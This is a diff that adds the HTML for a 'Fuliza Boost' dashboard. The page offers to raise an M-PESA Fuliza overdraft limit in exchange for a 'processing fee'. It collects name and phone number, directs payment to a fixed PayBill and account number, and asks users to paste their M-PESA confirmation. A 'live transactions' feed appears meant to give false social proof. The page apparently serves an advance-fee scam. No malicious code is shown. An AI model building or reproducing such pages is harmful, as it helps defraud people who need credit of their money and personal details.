@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Fuliza Boost - Fast & Reliable Instant Loan Processing">
+    <link rel="stylesheet" href="styles.css">
+    <title>Fuliza Boost Dashboard</title>
+</head>
+<body>
+    <header>
+        <h1>Fuliza Boost 💸</h1>
+        <p>Fast & Reliable Processing</p>
+    </header>
+
+    <div class="activity-bar" id="activityBar">
+        🔔 Waiting for activity...
+    </div>
+
+    <div class="wrapper">
+        <!-- LEFT PANEL -->
+        <div class="card">
+            <h3>Rules & Information</h3>
+            <ul>
+                <li>✔ Pay only processing fee</li>
+                <li>✔ Boost within 30 minutes</li>
+                <li>✔ M-PESA confirmation required</li>
+                <li>✔ 24/7 Service Available</li>
+                <li>✔ Instant Verification</li>
+            </ul>
+        </div>
+
+        <!-- CENTER PANEL - MAIN FORM -->
+        <div class="card">
+            <!-- STEP 1: Client Details -->
+            <div id="step1" class="step">
+                <h3>Client Details</h3>
+                <form id="clientForm">
+                    <div class="form-group">
+                        <label for="fullName">Full Name</label>
+                        <input 
+                            type="text" 
+                            id="fullName" 
+                            name="fullName"
+                            placeholder="Enter your full name"
+                            required
+                            aria-label="Full Name"
+                        >
+                    </div>
+
+                    <div class="form-group">
+                        <label for="phone">Phone Number</label>
+                        <input 
+                            type="tel" 
+                            id="phone" 
+                            name="phone"
+                            placeholder="07XXXXXXXX"
+                            pattern="^07\d{8}$"
+                            required
+                            aria-label="Phone Number"
+                        >
+                        <small class="error-message" id="phoneError"></small>
+                    </div>
+
+                    <button type="button" class="btn-primary" onclick="goStep2()">
+                        Proceed to Amount Selection
+                    </button>
+                </form>
+            </div>
+
+            <!-- STEP 2: Select Amount -->
+            <div id="step2" class="step hidden">
+                <button class="btn-back" onclick="backTo1()">⬅ Back</button>
+                <h3>Select Boost Amount</h3>
+
+                <div class="amount-boxes" id="amountContainer"></div>
+
+                <div class="fee-box" id="feeBox">
+                    <strong>Processing Fee:</strong> KES <span id="feeAmount">0</span>
+                </div>
+
+                <button id="payBtn" class="btn-primary" onclick="goStep3()" disabled>
+                    Proceed to Payment
+                </button>
+            </div>
+
+            <!-- STEP 3: Payment Confirmation -->
+            <div id="step3" class="step hidden">
+                <button class="btn-back" onclick="backTo2()">⬅ Back</button>
+                <h3>M-PESA Payment</h3>
+
+                <div class="fee-box" id="summaryBox"></div>
+
+                <div class="form-group">
+                    <label for="paybillCode">PayBill Number</label>
+                    <input 
+                        type="text" 
+                        id="paybillCode" 
+                        value="247247" 
+                        readonly
+                        aria-label="PayBill Code"
+                    >
+                </div>
+
+                <div class="form-group">
+                    <label for="accountNumber">Account Number</label>
+                    <input 
+                        type="text" 
+                        id="accountNumber" 
+                        value="1100185777880" 
+                        readonly
+                        aria-label="Account Number"
+                    >
+                </div>
+
+                <div class="form-group">
+                    <label for="mpesaConfirmation">M-PESA Confirmation Message</label>
+                    <textarea 
+                        id="mpesaConfirmation"
+                        name="mpesaConfirmation"
+                        placeholder="Paste your M-PESA confirmation message here"
+                        rows="4"
+                        required
+                        aria-label="M-PESA Confirmation Message"
+                    ></textarea>
+                    <small class="error-message" id="mpesaError"></small>
+                </div>
+
+                <button type="button" class="btn-primary" onclick="submitPayment()">
+                    Submit Confirmation
+                </button>
+
+                <div id="status" class="status-container"></div>
+            </div>
+        </div>
+
+        <!-- RIGHT PANEL - Live Transactions -->
+        <div class="card">
+            <h3>Live Transactions</h3>
+            <div class="live" id="liveBox">
+                <p class="live-placeholder">Transactions will appear here...</p>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <p>&copy; 2026 Fuliza Boost. All rights reserved.</p>
+    </footer>
+
+    <script src="app.js"></script>
+</body>
+</html>
